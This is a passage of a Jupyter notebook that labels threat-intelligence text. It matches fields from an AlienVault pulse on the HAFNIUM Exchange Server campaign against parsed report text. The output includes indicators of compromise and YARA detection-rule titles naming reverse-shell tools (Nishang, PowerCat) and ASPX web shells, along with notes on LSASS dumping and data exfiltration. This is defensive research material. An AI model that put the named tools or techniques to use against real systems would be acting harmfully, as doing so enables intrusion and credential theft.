HAFNIUM, written in ASP, is below:', None, <Element p at 0x1333f9d88>, 'text', (3, 331), (0, 328)), ('\\n', None, <Element p at 0x1333f9d88>, 'tail', (335, 336), (0, 1)), ('Following web shell deployment, HAFNIUM operators performed the following post-exploitation activity:', None, <Element p at 0x1333f9e48>, 'text', (3, 104), (0, 101)), ('\\n', None, <Element p at 0x1333f9e48>, 'tail', (108, 109), (0, 1)), ('Using Procdump to dump the LSASS process memory:', None, <Element li at 0x1333f9ec8>, 'text', (4, 52), (0, 48)), ('\\n', None, <Element li at 0x1333f9ec8>, 'tail', (57, 58), (0, 1)), ('Using 7-Zip to compress stolen data into ZIP files for exfiltration:', None, <Element li at 0x1333f9fc8>, 'text', (4, 72), (0, 68)), ...]"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "seq(analyzer.primary_subtree_leafs).map(product_by_contents).flatten().starmap(\n",
    "    product_by_entities\n",
    ").flatten().starmap(\n",
    "    lambda element, content, text: (\n",
    "        text.string,\n",
    "        text.entity,\n",
    "        # element.sourceline,\n",
    "        element,\n",
    "        content.property,\n",
    "        content.span,\n",
    "        text.span,\n",
    "    )\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# query"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:45.857437Z",
     "start_time": "2021-10-05T10:22:45.814406Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'AFNIUM%20t'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from lxml import etree\n",
    "\n",
    "etree.tounicode(analyzer.primary_subtree_leafs[1])[49:108][0:10]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-09-07T07:51:35.238266Z",
     "start_time": "2021-09-07T07:51:35.216433Z"
    }
   },
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Labeler"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- labeling_pipeline.ipynb\n",
    "- conllu_datafeeds"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:45.898085Z",
     "start_time": "2021-10-05T10:22:45.869936Z"
    }
   },
   "outputs": [],
   "source": [
    "# feed = seq.json(\"../data/hellokitty.feeds.json\").to_dict()\n",
    "feed = seq.json(\"../data/hafnium.feeds.json\").to_dict()\n",
    "\n",
    "# stix21 = seq.json(\"../data/hellokitty.stix21.6047944bd5bd6b6f323e59fa.json\").to_dict()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# check same fields from feed and stix"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* ('name',) \t('objects', 'name')\n",
    "* ('description',) \t('objects', 'description')\n",
    "* ('indicators', 'description')\t('objects', 'name')\n",
    "* ('indicators', 'description')\t('objects', 'description')\n",
    "* ('indicators', 'title') \t('objects', 'name')\n",
    "* ('attack_ids',) \t('objects', 'external_references', 'external_id')\n",
    "* ('references',) \t('objects', 'external_references', 'url') \n",
    "\n",
    "\n",
    "\n",
    "---\n",
    "('attack_ids',) \t('objects', 'external_references', 'external_id')\n",
    "('tags',) \t('objects', 'name') "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "('indicators', 'indicator')    \"pattern\": \"[file:hashes.MD5 = '136bd70f7aa98f52861879d7dca03cf2']\",\n",
    "\n",
    "('indicators', 'description')\t('objects', 'description')\n",
    "('indicators', 'is_active') \t('objects', 'is_family')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# AlientVault Feed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:46.003913Z",
     "start_time": "2021-10-05T10:22:45.913707Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "('HAFNIUM targeting Exchange Servers with 0-day exploits',\n",
       " '\"Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to HAFNIUM, a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.\"',\n",
       " 'HAFNIUM',\n",
       " ['webshell',\n",
       "  'aspx webshell',\n",
       "  'azure sentinel',\n",
       "  'hafnium',\n",
       "  'microsoft',\n",
       "  'exchange',\n",
       "  'server',\n",
       "  'powercat',\n",
       "  'covenant',\n",
       "  'procdump',\n",
       "  'lsass',\n",
       "  'service',\n",
       "  'powershell',\n",
       "  'cn_apt',\n",
       "  'China',\n",
       "  'email',\n",
       "  'Exploit',\n",
       "  'UNC2643',\n",
       "  'UNC2640',\n",
       "  'UNC2639',\n",
       "  'CVE-2021-26858',\n",
       "  'CVE-2021-26857',\n",
       "  'CVE-2021-27065',\n",
       "  'CVE-2021-26855'],\n",
       " ['United States of America'],\n",
       " ['Trojan.Agent.Hafnium', 'Cobalt Strike - S0154'],\n",
       " ['T1059', 'T1505'],\n",
       " ['Defense', 'Higher Education', 'Research', 'Law', 'NGO', 'Government'])"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from operator import itemgetter\n",
    "\n",
    "itemgetter(\n",
    "    \"name\",  # pulse.name\n",
    "    \"description\",  # pulse.description\n",
    "    \"adversary\",  # pulse.adversary\n",
    "    \"tags\",  # pulse.tags\n",
    "    \"targeted_countries\",  # pulse.targeted_countries\n",
    "    \"malware_families\",  # pulse.malware_families\n",
    "    \"attack_ids\",  # pulse.attack_ids\n",
    "    \"industries\",  # pulse.industries\n",
    ")(feed)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Pulse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:46.164599Z",
     "start_time": "2021-10-05T10:22:46.027561Z"
    }
   },
   "outputs": [],
   "source": [
    "from collections import namedtuple\n",
    "\n",
    "\n",
    "class PulseLabel(object):\n",
    "\n",
    "    Label = namedtuple(\"Label\", [\"type\", \"group\", \"role\"])\n",
    "\n",
    "    # pre-defined labels\n",
    "    Name = Label((\"pulse\", \"name\"), 0, None)\n",
    "    Description = Label((\"pulse\", \"description\"), 0, None)\n",
    "    Adversary = Label((\"pulse\", \"adversary\"), 0, None)\n",
    "    AttackId = Label((\"pulse\", \"attack_id\"), 0, None)\n",
    "    Tag = Label((\"pulse\", \"tag\"), 0, None)\n",
    "    TargetedCountry = Label((\"pulse\", \"targeted_country\"), 0, None)\n",
    "    MalwareFamily = Label((\"pulse\", \"malware_family\"), 0, None)\n",
    "    Industry = Label((\"pulse\", \"industry\"), 0, None)\n",
    "\n",
    "    def __init__(self, pulse_field: dict):\n",
    "        self.field = pulse_field\n",
    "\n",
    "    def select_by(self, key_name):\n",
    "        value = self.field.get(key_name)\n",
    "        return None if value is \"\" else value  # check and replace \"\" with None\n",
    "\n",
    "    @property\n",
    "    def name(self):\n",
    "        label = self.select_by(\"name\"), self.Name\n",
    "        return label\n",
    "\n",
    "    @property\n",
    "    def description(self):\n",
    "        label = self.select_by(\"description\"), self.Description\n",
    "        return label\n",
    "\n",
    "    @property\n",
    "    def adversary(self):\n",
    "        label = self.select_by(\"adversary\"), self.Adversary\n",
    "        return label\n",
    "\n",
    "    @property\n",
    "    def tags(self):\n",
    "        labels = product(self.select_by(\"tags\"), [self.Tag])\n",
    "        return labels\n",
    "\n",
    "    @property\n",
    "    def targeted_countries(self):\n",
    "        labels = product(self.select_by(\"targeted_countries\"), [self.TargetedCountry])\n",
    "        return labels\n",
    "\n",
    "    @property\n",
    "    def malware_families(self):\n",
    "        labels = product(self.select_by(\"malware_families\"), [self.MalwareFamily])\n",
    "        return labels\n",
    "\n",
    "    @property\n",
    "    def attack_ids(self):\n",
    "        labels = product(self.select_by(\"attack_ids\"), [self.AttackId])\n",
    "        return labels\n",
    "\n",
    "    @property\n",
    "    def industries(self):\n",
    "        labels = product(self.select_by(\"industries\"), [self.Industry])\n",
    "        return labels\n",
    "\n",
    "    def get_labels(self):\n",
    "        labels = [self.name, self.description, self.adversary]\n",
    "        labels = (\n",
    "            labels\n",
    "            + list(self.tags)\n",
    "            + list(self.targeted_countries)\n",
    "            + list(self.malware_families)\n",
    "            + list(self.attack_ids)\n",
    "            + list(self.industries)\n",
    "        )\n",
    "        return filter(lambda label: label[0] != None, labels)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:46.228278Z",
     "start_time": "2021-10-05T10:22:46.181878Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'HAFNIUM targeting Exchange Servers with 0-day exploits': Label(type=('pulse', 'name'), group=0, role=None),\n",
       " '\"Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to HAFNIUM, a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.\"': Label(type=('pulse', 'description'), group=0, role=None),\n",
       " 'HAFNIUM': Label(type=('pulse', 'adversary'), group=0, role=None),\n",
       " 'webshell': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'aspx webshell': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'azure sentinel': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'hafnium': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'microsoft': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'exchange': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'server': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'powercat': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'covenant': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'procdump': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'lsass': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'service': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'powershell': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'cn_apt': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'China': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'email': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'Exploit': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'UNC2643': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'UNC2640': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'UNC2639': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'CVE-2021-26858': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'CVE-2021-26857': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'CVE-2021-27065': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'CVE-2021-26855': Label(type=('pulse', 'tag'), group=0, role=None),\n",
       " 'United States of America': Label(type=('pulse', 'targeted_country'), group=0, role=None),\n",
       " 'Trojan.Agent.Hafnium': Label(type=('pulse', 'malware_family'), group=0, role=None),\n",
       " 'Cobalt Strike - S0154': Label(type=('pulse', 'malware_family'), group=0, role=None),\n",
       " 'T1059': Label(type=('pulse', 'attack_id'), group=0, role=None),\n",
       " 'T1505': Label(type=('pulse', 'attack_id'), group=0, role=None),\n",
       " 'Defense': Label(type=('pulse', 'industry'), group=0, role=None),\n",
       " 'Higher Education': Label(type=('pulse', 'industry'), group=0, role=None),\n",
       " 'Research': Label(type=('pulse', 'industry'), group=0, role=None),\n",
       " 'Law': Label(type=('pulse', 'industry'), group=0, role=None),\n",
       " 'NGO': Label(type=('pulse', 'industry'), group=0, role=None),\n",
       " 'Government': Label(type=('pulse', 'industry'), group=0, role=None)}"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "p = PulseLabel(feed)\n",
    "\n",
    "pulse_dict = seq(p.get_labels()).to_dict()\n",
    "pulse_dict"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Indicator"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:46.396252Z",
     "start_time": "2021-10-05T10:22:46.247823Z"
    }
   },
   "outputs": [],
   "source": [
    "class IndicatorLabel(object):\n",
    "\n",
    "    Label = namedtuple(\"Label\", [\"type\", \"group\", \"role\"])\n",
    "\n",
    "    def __init__(self, enumerated_group: int, indicator_field: dict):\n",
    "        self.group = enumerated_group\n",
    "        self.field = indicator_field\n",
    "\n",
    "    def select_by(self, key_name):\n",
    "        value = self.field.get(key_name)\n",
    "        return None if value is \"\" else value  # check and replace \"\" with None\n",
    "\n",
    "    @property\n",
    "    def indicator(self):\n",
    "\n",
    "        label_type = self.select_by(\"type\")\n",
    "        content = self.select_by(\"content\")\n",
    "\n",
    "        # check indicator's field isn't rule\n",
    "        if label_type is \"YARA\" and content.startswith(\"rule\"):\n",
    "            yara = self.select_by(\"content\")\n",
    "            label = self.Label((\"indicator\", label_type), self.group, \"rule\")\n",
    "            return yara, label\n",
    "        else:\n",
    "            indicator = self.select_by(\"indicator\")\n",
    "            label = self.Label(\n",
    "                (\"indicator\", label_type), self.group, self.select_by(\"role\")\n",
    "            )\n",
    "            return indicator, label\n",
    "\n",
    "    @property\n",
    "    def title(self):\n",
    "        title = self.select_by(\"title\")\n",
    "        label = self.Label((\"indicator\", \"title\"), self.group, None)\n",
    "        return title, label\n",
    "\n",
    "    @property\n",
    "    def description(self):\n",
    "        description = self.select_by(\"description\")\n",
    "        label = self.Label((\"indicator\", \"description\"), self.group, None)\n",
    "        return description, label\n",
    "\n",
    "    def get_labels(self):\n",
    "        labels = [self.indicator, self.title, self.description]\n",
    "        return filter(lambda label: label[0] != None, labels)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Labeler"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:46.465136Z",
     "start_time": "2021-10-05T10:22:46.414165Z"
    }
   },
   "outputs": [],
   "source": [
    "from enum import Enum\n",
    "from collections import ChainMap\n",
    "from functools import lru_cache\n",
    "from textdistance import jaro"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-07T08:00:59.574746Z",
     "start_time": "2021-10-07T08:00:59.512105Z"
    }
   },
   "outputs": [],
   "source": [
    "class FeedLabeler(object):\n",
    "    class MatchThreshold(Enum):\n",
    "        exactly_match = 1\n",
    "        fuzzy_match = 0.9\n",
    "\n",
    "    def __init__(self, feed):\n",
    "        self.feed = feed\n",
    "\n",
    "    @property\n",
    "    def pulse(self):\n",
    "        pulse = PulseLabel(self.feed)\n",
    "        pulse = seq(pulse.get_labels()).cache()\n",
    "        return pulse.to_dict()\n",
    "\n",
    "    @property\n",
    "    def indicators(self):\n",
    "        indicators = self.feed.get(\"indicators\")\n",
    "        indicators = (\n",
    "            seq(indicators)\n",
    "            .enumerate(1)\n",
    "            .map(lambda indicator: IndicatorLabel(*indicator))\n",
    "            .map(lambda indicator: indicator.get_labels())\n",
    "            .flatten()\n",
    "            .cache()\n",
    "        )\n",
    "        return indicators.to_dict()\n",
    "\n",
    "    @property\n",
    "    def labels(self):\n",
    "        return ChainMap(self.pulse, self.indicators)\n",
    "\n",
    "    def match_label(self, string, method=\"fuzzy_match\"):\n",
    "\n",
    "        # match\n",
    "        matching_results = (\n",
    "            seq(self.labels.items())\n",
    "            .starmap(lambda k, v: (jaro.normalized_similarity(k, string), v))\n",
    "            .filter(\n",
    "                lambda similar_string: similar_string[0]\n",
    "                >= self.MatchThreshold[method].value\n",
    "            )\n",
    "            .sorted(lambda similar_string: similar_string[0], reverse=True)\n",
    "            .cache()\n",
    "        )\n",
    "\n",
    "        if matching_results.empty():\n",
    "            label = None\n",
    "        else:\n",
    "            label = matching_results.starmap(lambda similarity, label: label).first()\n",
    "\n",
    "        return label"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-07T08:01:00.613467Z",
     "start_time": "2021-10-07T08:01:00.586852Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "ChainMap({'HAFNIUM targeting Exchange Servers with 0-day exploits': Label(type=('pulse', 'name'), group=0, role=None), '\"Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to HAFNIUM, a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.\"': Label(type=('pulse', 'description'), group=0, role=None), 'HAFNIUM': Label(type=('pulse', 'adversary'), group=0, role=None), 'webshell': Label(type=('pulse', 'tag'), group=0, role=None), 'aspx webshell': Label(type=('pulse', 'tag'), group=0, role=None), 'azure sentinel': Label(type=('pulse', 'tag'), group=0, role=None), 'hafnium': Label(type=('pulse', 'tag'), group=0, role=None), 'microsoft': Label(type=('pulse', 'tag'), group=0, role=None), 'exchange': Label(type=('pulse', 'tag'), group=0, role=None), 'server': Label(type=('pulse', 'tag'), group=0, role=None), 'powercat': Label(type=('pulse', 'tag'), group=0, role=None), 'covenant': Label(type=('pulse', 'tag'), group=0, role=None), 'procdump': Label(type=('pulse', 'tag'), group=0, role=None), 'lsass': Label(type=('pulse', 'tag'), group=0, role=None), 'service': Label(type=('pulse', 'tag'), group=0, role=None), 'powershell': Label(type=('pulse', 'tag'), group=0, role=None), 'cn_apt': Label(type=('pulse', 'tag'), group=0, role=None), 'China': Label(type=('pulse', 'tag'), group=0, role=None), 'email': Label(type=('pulse', 'tag'), group=0, role=None), 'Exploit': Label(type=('pulse', 'tag'), group=0, role=None), 'UNC2643': Label(type=('pulse', 'tag'), group=0, role=None), 'UNC2640': Label(type=('pulse', 'tag'), group=0, role=None), 'UNC2639': Label(type=('pulse', 'tag'), group=0, role=None), 'CVE-2021-26858': Label(type=('pulse', 'tag'), group=0, role=None), 'CVE-2021-26857': Label(type=('pulse', 'tag'), group=0, role=None), 'CVE-2021-27065': Label(type=('pulse', 'tag'), group=0, role=None), 'CVE-2021-26855': Label(type=('pulse', 'tag'), group=0, role=None), 'United States of America': Label(type=('pulse', 'targeted_country'), group=0, role=None), 'Trojan.Agent.Hafnium': Label(type=('pulse', 'malware_family'), group=0, role=None), 'Cobalt Strike - S0154': Label(type=('pulse', 'malware_family'), group=0, role=None), 'T1059': Label(type=('pulse', 'attack_id'), group=0, role=None), 'T1505': Label(type=('pulse', 'attack_id'), group=0, role=None), 'Defense': Label(type=('pulse', 'industry'), group=0, role=None), 'Higher Education': Label(type=('pulse', 'industry'), group=0, role=None), 'Research': Label(type=('pulse', 'industry'), group=0, role=None), 'Law': Label(type=('pulse', 'industry'), group=0, role=None), 'NGO': Label(type=('pulse', 'industry'), group=0, role=None), 'Government': Label(type=('pulse', 'industry'), group=0, role=None)}, {'097549cf7d0f76f0d99edf8b2d91c60977fd6a96e4b8c3c94b0b1733dc026d3e': Label(type=('indicator', 'FileHash-SHA256'), group=1, role=None), '1631a90eb5395c4e19c7dbcbf611bbe6444ff312eb7937e286e4637cb9e72944': Label(type=('indicator', 'FileHash-SHA256'), group=2, role=None), '2b6f1ebb2208e93ade4a6424555d6a8341fd6d9f60c25e44afe11008f5c1aad1': Label(type=('indicator', 'FileHash-SHA256'), group=3, role=None), '4edc7770464a14f54d17f36dc9d0fe854f68b346b27b35a6f5839adf1f13f8ea': Label(type=('indicator', 'FileHash-SHA256'), group=4, role=None), '511df0e2df9bfa5521b588cc4bb5f8c5a321801b803394ebc493db1ef3c78fa1': Label(type=('indicator', 'FileHash-SHA256'), group=5, role=None), '65149e036fff06026d80ac9ad4d156332822dc93142cf1a122b1841ec8de34b5': Label(type=('indicator', 'FileHash-SHA256'), group=6, role=None), '811157f9c7003ba8d17b45eb3cf09bef2cecd2701cedb675274949296a6a183d': Label(type=('indicator', 'FileHash-SHA256'), group=7, role=None), 'b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0': Label(type=('indicator', 'FileHash-SHA256'), group=8, role=None), 'CVE-2021-26858': Label(type=('indicator', 'CVE'), group=9, role=None), 'CVE-2021-26855': Label(type=('indicator', 'CVE'), group=10, role=None), 'CVE-2021-27065': Label(type=('indicator', 'CVE'), group=11, role=None), 'CVE-2021-26857': Label(type=('indicator', 'CVE'), group=12, role=None), '893cd3583b49cb706b3e55ecb2ed0757b977a21f5c72e041392d1256f31166e2': Label(type=('indicator', 'FileHash-SHA256'), group=13, role=None), '2fa06333188795110bba14a482020699a96f76fb1ceb80cbfa2df9d3008b5b0a': Label(type=('indicator', 'FileHash-SHA256'), group=14, role=None), '406b680edc9a1bb0e2c7c451c56904857848b5f15570401450b73b232ff38928': Label(type=('indicator', 'FileHash-SHA256'), group=15, role=None), '165.232.154.116': Label(type=('indicator', 'IPv4'), group=16, role=None), '028b507521a74862b27e0e0c7b4e672b3f8758a9': Label(type=('indicator', 'YARA'), group=17, role=None), 'HKTL_Nishang_PS1_Invoke_PowerShellTcpOneLine': Label(type=('indicator', 'title'), group=17, role=None), \"Detects PowerShell Oneliner in Nishang's repository\": Label(type=('indicator', 'description'), group=17, role=None), '0f6e708599b716dd3b24fdf6c75837d49b61fdd1': Label(type=('indicator', 'YARA'), group=18, role=None), 'HKTL_PS1_PowerCat_Mar21': Label(type=('indicator', 'title'), group=18, role=None), 'Detects PowerCat hacktool': Label(type=('indicator', 'description'), group=18, role=None), '0fd9bffa49c76ee12e51e3b8ae0609ac': Label(type=('indicator', 'FileHash-MD5'), group=19, role=None), '4b3039cf227c611c45d2242d1228a121': Label(type=('indicator', 'FileHash-MD5'), group=20, role=None), '79eb217578bed4c250803bd573b10151': Label(type=('indicator', 'FileHash-MD5'), group=21, role=None), '0ba9a76f55aaa495670d74d21850d0155ff5d6a5': Label(type=('indicator', 'FileHash-SHA1'), group=22, role=None), 'SHA1 of 4b3039cf227c611c45d2242d1228a121': Label(type=('indicator', 'description'), group=22, role=None), '182.18.152.105': Label(type=('indicator', 'IPv4'), group=23, role=None), '89.34.111.11': Label(type=('indicator', 'IPv4'), group=24, role='scanning_host'), '8a7252d3fd1b2d8e2b39dc1cedbe1e9a42cc0e07': Label(type=('indicator', 'YARA'), group=25, role='file_scanning'), 'WEBSHELL_ASPX_reGeorgTunnel': Label(type=('indicator', 'title'), group=25, role=None), 'variation on reGeorgtunnel': Label(type=('indicator', 'description'), group=25, role=None), '379f9d50e0c0fb8f5489a9d0954e88100397735b': Label(type=('indicator', 'YARA'), group=26, role=None), 'WEBSHELL_ASPX_SportsBall': Label(type=('indicator', 'title'), group=26, role=None), 'The SPORTSBALL webshell allows attackers to upload files or execute commands on the system.': Label(type=('indicator', 'description'), group=26, role=None), 'be4729822905d1cdc66122b3ae3084721ba49f1e': Label(type=('indicator', 'YARA'), group=27, role=None), 'APT_HAFNIUM_Forensic_Artifacts_Mar21_1': Label(type=('indicator', 'title'), group=27, role=None), 'Detects forensic artifacts found in HAFNIUM intrusions': Label(type=('indicator', 'description'), group=27, role=None), '26cc3213d699f6baee818a9cd7c45214e14a931c': Label(type=('indicator', 'YARA'), group=28, role=None), 'WEBSHELL_ASPX_SimpleSeeSharp': Label(type=('indicator', 'title'), group=28, role=None), 'A simple ASPX Webshell that allows an attacker to write further files to disk.': Label(type=('indicator', 'description'), group=28, role=None), 'a170155e35b7e4689c93325087fe4479c164604b': Label(type=('indicator', 'YARA'), group=29, role=None), 'EXPL_LOG_CVE_2021_27065_Exchange_Forensic_Artifacts_Mar21_1': Label(type=('indicator', 'title'), group=29, role=None), 'Detects forensic artifacts found in HAFNIUM intrusions exploiting CVE-2021-27065': Label(type=('indicator', 'description'), group=29, role=None), 'fd72bba6dea94c4759731571b17ce20b7e135a8e': Label(type=('indicator', 'YARA'), group=30, role=None), 'EXPL_LOG_CVE_2021_26858_Exchange_Forensic_Artifacts_Mar21_1': Label(type=('indicator', 'title'), group=30, role=None), 'Detects forensic artifacts found in HAFNIUM intrusions exploiting CVE-2021-26858': Label(type=('indicator', 'description'), group=30, role=None)})"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "fl = FeedLabeler(feed)\n",
    "\n",
    "fl.labels"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Test"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:46.805034Z",
     "start_time": "2021-10-05T10:22:46.776198Z"
    }
   },
   "outputs": [],
   "source": [
    "fl.labels.get(\"T1005\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:46.921092Z",
     "start_time": "2021-10-05T10:22:46.873923Z"
    }
   },
   "outputs": [],
   "source": [
    "fl.labels.get(\"T100\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-07T08:01:15.858965Z",
     "start_time": "2021-10-07T08:01:15.837928Z"
    }
   },
   "outputs": [],
   "source": [
    "fl.match_label(\"T1005\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-07T08:02:12.862554Z",
     "start_time": "2021-10-07T08:02:12.833881Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Label(type=('pulse', 'adversary'), group=0, role=None)"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "fl.match_label(\"HAFNIUM\", method=\"exactly_match\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Label(type=('pulse', 'adversary'), group=0, role=None)"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "fl.match_label(\"HAFNIUM\", method=\"fuzzy_match\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-07T08:01:08.382614Z",
     "start_time": "2021-10-07T08:01:08.293127Z"
    }
   },
   "outputs": [],
   "source": [
    "fl.match_label(\n",
    "    \"HelloKitty is a ransomware family that emerged in late 2020. While it lacks the sophistication of some of the more well-known families such as Ryuk, REvil, and Conti, it has nevertheless struck some notable targets, including CEMIG0. In this post, Sentinel Labs analyzes a recent HelloKitty sample and outlines the basic behaviors and traits associated with this family of ransomware.\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Test"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:47.262063Z",
     "start_time": "2021-10-05T10:22:47.212518Z"
    }
   },
   "outputs": [],
   "source": [
    "testing_yara = {\n",
    "    \"id\": 2883057223,\n",
    "    \"indicator\": \"0f6e708599b716dd3b24fdf6c75837d49b61fdd1\",\n",
    "    \"type\": \"YARA\",\n",
    "    \"created\": \"2021-03-03T15:23:29\",\n",
